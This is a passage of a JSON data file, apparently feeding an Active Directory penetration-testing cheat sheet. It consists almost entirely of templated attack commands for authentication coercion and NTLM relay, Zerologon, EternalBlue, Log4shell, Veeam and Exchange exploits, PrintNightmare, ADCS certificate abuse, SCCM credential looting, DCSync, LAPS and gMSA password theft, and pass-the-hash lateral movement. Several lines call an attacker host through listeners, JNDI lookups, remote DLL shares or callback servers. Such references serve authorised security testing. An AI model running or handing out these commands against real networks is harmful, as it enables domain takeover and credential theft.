              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
              "SharpSCCM.exe local site-info"
            ]
          },
          {
            "desc": "Scan Auto",
            "subdesc": "",
            "cmd": [
              "from BH result",
              "AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>",
              "PingCastle.exe --healthcheck --server <domain>",
              "Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>"
            ]
          },
          {
            "desc": "Kerberoasting",
            "subdesc": "Hash TGS",
            "cmd": [
              "MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u",
              "GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>",
              "Rubeus.exe kerberoast"
            ]
          },
          {
            "desc": "Coerce",
            "subdesc": "",
            "cmd": [
              "Drop file",
              ".lnk",
              "nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>",
              ".scf",
              "nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>",
              ".url",
              "[InternetShortcut]... IconFile=\\\\<attacker_ip>\\%USERNAME%.icon",
              "Other files",
              "ntlm_theft.py -g all -s <your_ip> -f test",
              "Webdav",
              "Enable webclient",
              ".searchConnector-ms",
              "nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc",
              "add attack computer in dns",
              "dnstool.py -u <domain>\\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>",
              "Launch coerce with <attacker_hostname>@80/x as target >>> HTTP Coerce",
              "RPC call >>> SMB NTLM Coerce",
              "printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>",
              "petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>",
              "coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>",
              "Coerce kerberos >>> SMB Kerberos coerce",
              "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -d \"<attacker_ip>\" --action add \"<dns_server_ip>\" -r \"<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp",
              "petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>"
            ]
          },
          {
            "desc": "Intra ID Connect",
            "subdesc": "",
            "cmd": [
              "Find MSOL",
              "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__low_hanging",
        "name": "Quick Compromise",
        "description": "",
        "commands": [
          {
            "desc": "⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@",
            "subdesc": "Domain admin",
            "cmd": [
              "zerologon-scan '<dc_netbios_name>' '<ip>",
              "cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>"
            ]
          },
          {
            "desc": "Eternal Blue MS17-010 @CVE@",
            "subdesc": "Admin || Low access",
            "cmd": [
              "msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only"
            ]
          },
          {
            "desc": "Tomcat/Jboss Manager",
            "subdesc": "Admin || Low access",
            "cmd": [
              "msf> auxiliary/scanner/http/tomcat_enum",
              "msf> exploit/multi/http/tomcat_mgr_deploy"
            ]
          },
          {
            "desc": "Java RMI",
            "subdesc": "Admin || Low access",
            "cmd": [
              "msf> use exploit/multi/misc/java_rmi_server"
            ]
          },
          {
            "desc": "Java Serialiszed port",
            "subdesc": "Admin || Low access",
            "cmd": [
              "ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>"
            ]
          },
          {
            "desc": "Log4shell",
            "subdesc": "Admin || Low access",
            "cmd": [
              "${jndi:ldap://<ip>:<port>/o=reference}"
            ]
          },
          {
            "desc": "Database",
            "subdesc": "Admin || Low access",
            "cmd": [
              "msf> use auxiliary/admin/mssql/mssql_enum_sql_logins"
            ]
          },
          {
            "desc": "Exchange",
            "subdesc": "Admin",
            "cmd": [
              "Proxyshell @CVE@",
              "proxyshell_rce.py -u https://<exchange> -e administrator@<domain>"
            ]
          },
          {
            "desc": "Veeam",
            "subdesc": "User Account || Low access || Admin",
            "cmd": [
              "CVE-2023-27532 (creds - Veeam backup) @CVE@",
              "VeeamHax.exe --target <veeam_server>",
              "CVE-2023-27532 net.tcp:/<target>:<port>/",
              "CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager) @CVE@",
              "CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>",
              "CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator) @CVE@",
              "CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/",
              "CVE-2024-40711 (unserialize - Veeam backup) @CVE@",
              "CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>"
            ]
          },
          {
            "desc": "GLPI",
            "subdesc": "Admin || Low access",
            "cmd": [
              "CVE-2022-35914 @CVE@",
              "/vendor/htmlawed/htmlawed/htmLawedTest.php",
              "CVE_2023_41320 @CVE@",
              "cve_2023_41320.py -u <user> -p <password> -t <ip>"
            ]
          },
          {
            "desc": "Weak websites / services",
            "subdesc": "",
            "cmd": [
              "nuclei",
              "nuclei -target <ip_range>",
              "nessus"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__know_vuln_auth",
        "name": "Known Vulns (Authenticated)",
        "description": "",
        "commands": [
          {
            "desc": "MS14-068",
            "subdesc": "PTT >>> Domain admin || Admin",
            "cmd": [
              "findSMB2UPTime.py <ip>",
              "ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>",
              "msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum",
              "goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target"
            ]
          },
          {
            "desc": "GPP MS14-025",
            "subdesc": "Domain admin",
            "cmd": [
              "msf> use auxiliary/scanner/smb/smb_enum_gpp",
              "findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml",
              "Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>"
            ]
          },
          {
            "desc": "PrivExchange (CVE-2019-0724, CVE-2019-0686)",
            "subdesc": "HTTP Coerce >>> Domain admin || Admin",
            "cmd": [
              "privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>"
            ]
          },
          {
            "desc": "noPac (CVE-2021-42287, CVE-2021-42278)",
            "subdesc": "PTT >>> DCSYNC >>> Domain admin",
            "cmd": [
              "nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan",
              "noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt"
            ]
          },
          {
            "desc": "PrintNightmare (CVE-2021-1675, CVE-2021-34527)",
            "subdesc": "Admin",
            "cmd": [
              "nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan",
              "printnightmare.py -dll '\\\\<attacker_ip>\\smb\\add_user.dll' '<user>:<password>@<ip>"
            ]
          },
          {
            "desc": "Certifried (CVE-2022-26923)",
            "subdesc": "PTT >>> DCSYNC >>> Domain admin",
            "cmd": [
              "Create account",
              "certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>",
              "Request",
              "certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine",
              "Authentication",
              "certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>"
            ]
          },
          {
            "desc": "ProxyNotShell (CVE-2022-41040, CVE-2022-41082)",
            "subdesc": "Admin",
            "cmd": [
              "poc_aug3.py <host> <username> <password> <command>"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__acl",
        "name": "ACL / ACE Abuse",
        "description": "",
        "commands": [
          {
            "desc": "Dcsync",
            "subdesc": "Domain Admin || Lateral move || Crack hash",
            "cmd": [
              "Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts",
              "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
              "secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>"
            ]
          },
          {
            "desc": "can change msDS-KeyCredentialLInk (Generic Write) + ADCS",
            "subdesc": "PassTheCertificate",
            "cmd": [
              "Shadow Credentials",
              "certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>",
              "pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list"
            ]
          },
          {
            "desc": "On Group",
            "subdesc": "",
            "cmd": [
              "GenericAll/GenericWrite/Self/Add Extended Rights",
              "Add member to the group",
              "Write Owner",
              "Grant Ownership",
              "WriteDACL + WriteOwner",
              "Grant rights",
              "Give yourself generic all"
            ]
          },
          {
            "desc": "On Computer",
            "subdesc": "",
            "cmd": [
              "GenericAll / GenericWrite",
              "msDs-AllowedToActOnBehalf >>> RBCD",
              "add Key Credentials >>> shadow credentials"
            ]
          },
          {
            "desc": "On User",
            "subdesc": "",
            "cmd": [
              "GenericAll / GenericWrite",
              "Change password",
              "net user <user> <password> /domain` >>> User with clear text pass",
              "add SPN (target kerberoasting)",
              "targetedKerberoast.py -d <domain> -u <user> -p <pass>` >>> Hash found (TGS)",
              "add key credentials >>> shadow credentials",
              "login script >>> Access",
              "ForceChangePassword",
              "net user <user> <password> /domain` >>> User with clear text pass"
            ]
          },
          {
            "desc": "On OU",
            "subdesc": "",
            "cmd": [
              "Write Dacl",
              "ACE Inheritance",
              "Grant rights",
              "GenericAll / GenericWrite / Manage Group Policy Links",
              "OUned.py --config config.ini"
            ]
          },
          {
            "desc": "ReadGMSAPassword",
            "subdesc": "",
            "cmd": [
              "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>",
              "nxc ldap <ip> -u <user> -p <pass> --gmsa",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa"
            ]
          },
          {
            "desc": "Get LAPS passwords",
            "subdesc": "",
            "cmd": [
              "Who can read LAPS",
              "MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p",
              "Read LAPS >>> Admin",
              "Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps",
              "foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}",
              "nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps",
              "msf> use post/windows/gather/credentials/enum_laps"
            ]
          },
          {
            "desc": "GPO",
            "subdesc": "",
            "cmd": [
              "Who can control GPOs",
              "MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p",
              "SID of principals that can create new GPOs in the domain",
              "Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=blah,DC=com\" -ResolveGUIDs  | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl",
              "Return the principals that can write to the GP-Link attribute on OUs",
              "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl",
              "Generic Write on  GPO",
              "Abuse GPO >>> ACCESS"
            ]
          },
          {
            "desc": "DNS Admin",
            "subdesc": "",
            "cmd": [
              "DNSadmins abuse (CVE-2021-40469) @CVE@ >>> Admin",
              "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll> # need a dnsadmin user",
              "sc \\\\DNSServer stop dns sc \\\\DNSServer start dns"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__delegation",
        "name": "Kerberos Delegation",
        "description": "",
        "commands": [
          {
            "desc": "Find delegation",
            "subdesc": "",
            "cmd": [
              "findDelegation.py \"<domain>\"/\"<user>\":\"<password>",
              "With BloodHound",
              "Unconstrained",
              "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c",
              "MATCH (c:User {unconstraineddelegation:true}) RETURN c",
              "Constrained",
              "MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p",
              "MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: \"<MYTARGET.FQDN>\"})) RETURN p"
            ]
          },
          {
            "desc": "Unconstrained delegation",
            "subdesc": "Kerberos TGT >>> PassTheTicket",
            "cmd": [
              "UAC: ADS_UF_TRUSTED_FOR_DELEGATION",
              "Force connection  with coerce",
              "Get tickets",
              "mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export",
              "Rubeus.exe dump /service:krbtgt /nowrap",
              "Rubeus.exe dump /luid:0xdeadbeef /nowrap",
              "Rubeus.exe monitor /interval:5"
            ]
          },
          {
            "desc": "Constrained delegation",
            "subdesc": "",
            "cmd": [
              "With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION",
              "Get TGT for user",
              "Request S4u2self",
              "Request S4u2proxy",
              "Rubeus.exe hash /password:<password>",
              "Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>",
              "Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt",
              "Altservice HTTP/HOST/CIFS/LDAP  >>> Kerberos TGS",
              "getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>",
              "Altservice HTTP/HOST/CIFS/LDAP >>> Kerberos TGS",
              "Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION",
              "Constrain between Y and Z",
              "Add computer X",
              "Add RBCD : delegate from X to Y",
              "s4u2self X (impersonate admin)",
              "S4u2Proxy X (impersonate admin on spn/Y)",
              "Forwardable TGS for Y",
              "S4u2Proxy Y (impersonate admin on spn/Z)",
              "add computer account",
              "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>",
              "RBCD With added computer account >>> Kerberos TGS",
              "rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$",
              "getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>",
              "getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>",
              "Self RBCD @CVE@",
              "Like RBCD without add computer"
            ]
          },
          {
            "desc": "Resource-Based Constrained Delegation",
            "subdesc": "",
            "cmd": [
              "add computer account",
              "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>",
              "RBCD With added computer account",
              "Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>",
              "Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt` >>> Admin",
              "rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>",
              "getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>` >>> Kerberos TGT >>> Admin"
            ]
          },
          {
            "desc": "S4U2self abuse",
            "subdesc": "",
            "cmd": [
              "Get machine account (X)'s TGT",
              "Get a ST on X as user admin",
              "getTGT.py -dc-ip \"<dc_ip>\" -hashes :\"<machine_hash>\" \"<domain>\"/\"<machine>$",
              "getST.py -self -impersonate \"<admin>\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>\"/'<machine>$'` >>> Admin"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__adcs",
        "name": "ADCS",
        "description": "",
        "commands": [
          {
            "desc": "Enumeration",
            "subdesc": "Web enrollement || Vulnerable template || Vulnerable CA || Misconfigured ACL || Vulnerable PKI Object AC",
            "cmd": [
              "certutil -v -dsTemplate",
              "certify.exe find [ /vulnerable]",
              "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>",
              "ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates",
              "Get PKI objects information",
              "certify.exe pkiobjects",
              "Display CA information",
              "certutil -TCAInfo",
              "certify.exe cas"
            ]
          },
          {
            "desc": "Web Enrollment Is Up",
            "subdesc": "Domain admin",
            "cmd": [
              "ESC8 >>> Pass the ticket >>> DCSYNC || LDAP shell",
              "ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController",
              "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
              "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
              "certipy relay -target http://<ip_ca>",
              "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
            ]
          },
          {
            "desc": "Misconfigured Certificate Template",
            "subdesc": "",
            "cmd": [
              "ESC1 >>> Pass the certificate",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>",
              "certify.exe request /ca:<server>\\<ca-name>   /template:\"<vulnerable template name>\" [/altname:\"Admin\"]",
              "ESC2 >>> ESC3",
              "ESC3",
              "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>",
              "certify.exe request request /ca:<server>\\<ca-name> /template:<template>  /onbehalfof:<domain>\\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name>",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template  '<vulnerable template name>'  -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>",
              "ESC13 >>> Pass The Certificate (PKINIT)",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server>  -template '<vulnerable template name>' -ca <ca_name>",
              "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>",
              "ESC15",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]` >>> Pass the certificate (only Schannel)",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]` >>> Pass the certificate",
              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>"
            ]
          },
          {
            "desc": "Misconfigured ACL",
            "subdesc": "",
            "cmd": [
              "ESC4",
              "write privilege over a certificate template",
              "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug` >>> ESC1",
              "restore template",
              "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json",
              "ESC7",
              "Manage CA",
              "certipy ca -ca <ca_name> -add-officer  '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>` >>> ESC7 Manage certificate",
              "Manage certificate",
              "certipy ca  -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>",
              "certipy  req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn '<target_user>",
              "error, but save private key and get issue request",
              "Issue request",
              "certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>",
              "certipy req -u <user>@<domain> -p '<password>'  -ca <ca_name> -retreive <request_id>` >>> Pass the certificate"
            ]
          },
          {
            "desc": "Vulnerable PKI Object access control",
            "subdesc": "",
            "cmd": [
              "ESC5",
              "Vulnerable acl on PKI >>> ACL",
              "Golden certificate",
              "certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>",
              "certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>` >>> Pass the certificate"
            ]
          },
          {
            "desc": "Misconfigured Certificate Authority",
            "subdesc": "",
            "cmd": [
              "ESC6 @CVE@ >>> ESC1",
              "Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication",
              "ESC11 >>> Pass the ticket >>> DCSYNC >>> Domain Admin",
              "ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>",
              "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
              "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
              "certipy relay -target rpc://<ip_ca> -ca '<ca_name>",
              "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
            ]
          },
          {
            "desc": "Abuse Certificate Mapping",
            "subdesc": "",
            "cmd": [
              "ESC9/ESC10 (implicit)",
              "certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>",
              "ESC9/ESC10 (Case 1)",
              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator` >>> reset accountB UPN",
              "ESC9",
              "certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>",
              "ESC10 (case 1)",
              "certipy req  -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>",
              "ESC10 (Case 2)",
              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'` >>> ESC10  Case1",
              "reset accountB UPN",
              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>` >>> Pass The Certificate",
              "[Kerberos Mapping] ESC9/ESC10(Case 1)",
              "[Schannel Mapping] ESC9/ESC10 (Case 2)",
              "ESC14 (explicit)"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__sccm",
        "name": "SCCM",
        "description": "",
        "commands": [
          {
            "desc": "recon",
            "subdesc": "",
            "cmd": [
              "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
              "sccmhunter.py show -all",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
              "nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares"
            ]
          },
          {
            "desc": "Creds-1 No credentials",
            "subdesc": "NAA credentials || User + Pass",
            "cmd": [
              "Extract from pxe See no creds >>> PXE"
            ]
          },
          {
            "desc": "Elevate-1:Relay on site systems Simple user",
            "subdesc": "Admin on Site system",
            "cmd": [
              "coerce sccm site server",
              "ntlmrelayx.py -tf <site_systems> -smb2support"
            ]
          },
          {
            "desc": "Elevate-2:Force client push Simple user",
            "subdesc": "Admin",
            "cmd": [
              "ntlmrelayx.py -t <sccm_server> -smb2support -socks # listen connection",
              "SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install",
              "proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>",
              "cleanup"
            ]
          },
          {
            "desc": "Elevate-3:Automatic client push Simple user",
            "subdesc": "Relay ntlm",
            "cmd": [
              "Create DNS A record for non existing computer x",
              "dnstool.py -u '<domain>\\<user>' -p <pass>  -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>",
              "Enroll new computer x in AD  then remove host SPN from the machine account",
              "setspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>",
              "wait 5m for client push",
              "ntlmrelayx.py -tf <no_signing_target> -smb2support -socks",
              "cleanup"
            ]
          },
          {
            "desc": "CRED-6 Loot creds",
            "subdesc": "User + Pass",
            "cmd": [
              "SCCM SMB service (445/TCP) on a DP",
              "cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt",
              "SCCM HTTP service (80/TCP or 443/TCP) on a DP",
              "SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>",
              "SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>",
              "sccm-http-looter -server <ip_dp>"
            ]
          },
          {
            "desc": "Takeover-1:relay to mssql db Simple user",
            "subdesc": "SCCM ADMIN",
            "cmd": [
              "SCCM MSSQL != SSCM server",
              "sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked",
              "ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q \"<query>",
              "coerce sccm_mssql -> attacker",
              "sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>"
            ]
          },
          {
            "desc": "Takeover-2:relay to mssql server Simple user",
            "subdesc": "Admin MSSQL",
            "cmd": [
              "SCCM MSSQL != SSCM server",
              "ntlmrelayx.py -t <sccm_mssql> -smb2support -socks",
              "coerce sccm_server",
              "proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>"
            ]
          },
          {
            "desc": "Creds-2:Policy Request Credentials Simple user",
            "subdesc": "User + Pass",
            "cmd": [
              "add computer",
              "sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\\<computer_added>$' '<computer_pass>",
              "get NetworkAccessUsername and NetworkAccessPassword",
              "policysecretunobfuscate.py",
              "delete device created after sccmadmin",
              "SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>",
              "cleanup"
            ]
          },
          {
            "desc": "Creds-3Creds-4 Computer Admin user",
            "subdesc": "NAA credentials",
            "cmd": [
              "dploot.py sccm -u <admin> -p '<password>' <sccm_target>",
              "sccmhunter.py dpapi  -u <admin> -p '<password>' -target <sccm_target> -debug",
              "SharpSCCM.exe local secrets -m disk",
              "SharpSCCM.exe local secrets -m wmi"
            ]
          },
          {
            "desc": "Creds-5 SCCM admin",
            "subdesc": "Site DB credentials",
            "cmd": [
              "secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>",
              "mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>",
              "use CM_<site_code>;",
              "SELECT * FROM SC_UserAccount;",
              "sccmdecryptpoc.exe <cyphered_value>"
            ]
          },
          {
            "desc": "EXEC-1/2 SCCM admin",
            "subdesc": "lat",
            "cmd": [
              "SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner",
              "sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>",
              "get_device <hostname>",
              "interact <device_id>",
              "script xploit.ps1"
            ]
          },
          {
            "desc": "Cleanup",
            "subdesc": "",
            "cmd": [
              "SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p \"Name\" -p \"ResourceId\" -p \"SMSUniqueIdentifier",
              "SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>"
            ]
          },
          {
            "desc": "Post exploit",
            "subdesc": "",
            "cmd": [
              "as sccm admin",
              "SCCMHound.exe --server <server> --sitecode <sitecode>` >>> Users sessions"
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__lat_move",
        "name": "Lateral Movement",
        "description": "",
        "commands": [
          {
            "desc": "Clear text Password",
            "subdesc": "Admin",
            "cmd": [
              "Interactive-shell - psexec >>> Authority/System",
              "psexec.py <domain>/<user>:<password>@<ip>",
              "psexec.exe -AcceptEULA \\\\<ip>",
              "psexecsvc.py <domain>/<user>:<password>@<ip>",
              "Pseudo-shell (file write and read)",
              "atexec.py  <domain>/<user>:<password>@<ip> \"command",
              "smbexec.py  <domain>/<user>:<password>@<ip>",
              "wmiexec.py  <domain>/<user>:<password>@<ip>",
              "dcomexec.py  <domain>/<user>:<password>@<ip>",
              "nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>",
              "WinRM >>> Low access || Admin",
              "evil-winrm -i <ip> -u <user> -p <password>",
              "Enter-PSSession -ComputerName <computer> -Credential <domain>\\<user>",
              "nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>",
              "RDP >>> Low access || Admin",
              "xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>",
              "SMB >>> Search files",
              "smbclient.py <domain>/<user>:<password>@<ip>",
              "smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>",
              "MSSQL >>> MSSQL",
              "nxc mssql <ip_range> -u <user> -p <password>",
              "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
            ]
          },
          {
            "desc": "NT Hash",
            "subdesc": "",
            "cmd": [
              "Pass the Hash",
              "MSSQL/PseudoShell PsExec/SMB...  >>> Admin",
              "impacket : same as with creds, but use -hashes ':<hash>",
              "nxc : same as with creds, but use -H ':<hash>",
              "mimikatz \"privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>\"` >>> Admin",
              "RDP >>> Low access || Admin",
